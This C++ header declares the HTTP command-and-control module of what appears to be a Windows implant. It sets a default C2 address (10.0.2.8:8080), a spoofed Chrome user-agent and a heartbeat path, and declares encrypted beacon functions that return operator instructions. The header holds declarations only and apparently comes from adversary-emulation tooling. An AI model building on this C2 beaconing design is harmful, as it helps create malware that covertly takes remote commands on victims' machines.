#pragma once

#include <windows.h>
#include <WinInet.h>
#include <tchar.h>
#include <vector>
#include <string>
#include <errhandlingapi.h>
#include <set>
#include <cmath>
#include <iostream>

#include "cryptopp/modes.h"
#include "cryptopp/osrng.h"
#include "cryptopp/rsa.h"
#include "cryptopp/secblock.h"
#include "cryptopp/base64.h"
#include "base64_y.h"
#include "bzlib.h"
#include "instruction.h"

#pragma comment(lib, "wininet.lib")

#define RESP_BUFFER_SIZE 4096

#define AES_KEY_SIZE 32

#ifndef C2_ADDRESS
#define DEFAULT_C2_ADDRESS "10.0.2.8"
#else
#define DEFAULT_C2_ADDRESS (C2_ADDRESS)
#endif

#ifndef C2_PORT
#define DEFAULT_C2_PORT 8080
#else
#define DEFAULT_C2_PORT (C2_PORT)
#endif

#ifndef USE_HTTPS
#define DEFAULT_USE_HTTPS false
#else
#define DEFAULT_USE_HTTPS (USE_HTTPS)
#endif

#define DEFAULT_USER_AGENT "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
#define HEARTBEAT_PATH "/"

namespace comms {

// Interface for API calls to be wrapped. Will be used in source code and test files.
class CommsHttpWrapperInterface {
public:
    CommsHttpWrapperInterface() {}
    virtual ~CommsHttpWrapperInterface() {}

    // Wrapper for InternetOpenA (wininet.h)
    virtual HINTERNET InternetOpenWrapper(
        LPCSTR  lpszAgent,
        DWORD   dwAccessType,
        LPCSTR  lpszProxy,
        LPCSTR  lpszProxyBypass,
        DWORD   dwFlags
    ) = 0;

    // Wrapper for InternetCloseHandle (wininet.h)
    virtual BOOL InternetCloseHandleWrapper(HINTERNET hInternet) = 0;

    // Wrapper for GetLastError (errhandlingapi.h)
    virtual DWORD GetLastErrorWrapper() = 0;

    // Wrapper for InternetConnectA (wininet.h)
    virtual HINTERNET InternetConnectWrapper(
        HINTERNET     hInternet,
        LPCSTR        lpszServerName,
        INTERNET_PORT nServerPort,
        LPCSTR        lpszUserName,
        LPCSTR        lpszPassword,
        DWORD         dwService,
        DWORD         dwFlags,
        DWORD_PTR     dwContext
    ) = 0;

    // Wrapper for HttpOpenRequestA (wininet.h)
    virtual HINTERNET HttpOpenRequestWrapper(
        HINTERNET hConnect,
        LPCSTR    lpszVerb,
        LPCSTR    lpszObjectName,
        LPCSTR    lpszVersion,
        LPCSTR    lpszReferrer,
        LPCSTR* lplpszAcceptTypes,
        DWORD     dwFlags,
        DWORD_PTR dwContext
    ) = 0;

    // Wrapper for HttpSendRequestA (wininet.h)
    virtual BOOL HttpSendRequestWrapper(
        HINTERNET hRequest,
        LPCSTR    lpszHeaders,
        DWORD     dwHeadersLength,
        LPVOID    lpOptional,
        DWORD     dwOptionalLength
    ) = 0;

    // Wrapper for InternetReadFile (wininet.h)
    virtual BOOL InternetReadFileWrapper(
        HINTERNET hFile,
        LPVOID    lpBuffer,
        DWORD     dwNumberOfBytesToRead,
        LPDWORD   lpdwNumberOfBytesRead
    ) = 0;
};

class CommsHttpWrapper : public CommsHttpWrapperInterface {
public:
    HINTERNET InternetOpenWrapper(
        LPCSTR  lpszAgent,
        DWORD   dwAccessType,
        LPCSTR  lpszProxy,
        LPCSTR  lpszProxyBypass,
        DWORD   dwFlags
    );

    BOOL InternetCloseHandleWrapper(HINTERNET hInternet);

    DWORD GetLastErrorWrapper();

    HINTERNET InternetConnectWrapper(
        HINTERNET     hInternet,
        LPCSTR        lpszServerName,
        INTERNET_PORT nServerPort,
        LPCSTR        lpszUserName,
        LPCSTR        lpszPassword,
        DWORD         dwService,
        DWORD         dwFlags,
        DWORD_PTR     dwContext
    );

    HINTERNET HttpOpenRequestWrapper(
        HINTERNET hConnect,
        LPCSTR    lpszVerb,
        LPCSTR    lpszObjectName,
        LPCSTR    lpszVersion,
        LPCSTR    lpszReferrer,
        LPCSTR* lplpszAcceptTypes,
        DWORD     dwFlags,
        DWORD_PTR dwContext
    );

    BOOL HttpSendRequestWrapper(
        HINTERNET hRequest,
        LPCSTR    lpszHeaders,
        DWORD     dwHeadersLength,
        LPVOID    lpOptional,
        DWORD     dwOptionalLength
    );

    BOOL InternetReadFileWrapper(
        HINTERNET hFile,
        LPVOID    lpBuffer,
        DWORD     dwNumberOfBytesToRead,
        LPDWORD   lpdwNumberOfBytesRead
    );
};

instruction::Instruction Heartbeat(CommsHttpWrapperInterface* comms_http_wrapper, LPCSTR address, WORD port, char* data, DWORD data_len);

std::string FormatHeartbeatRequest(std::string uuid, std::string type, std::string data, bool encrypt);

}
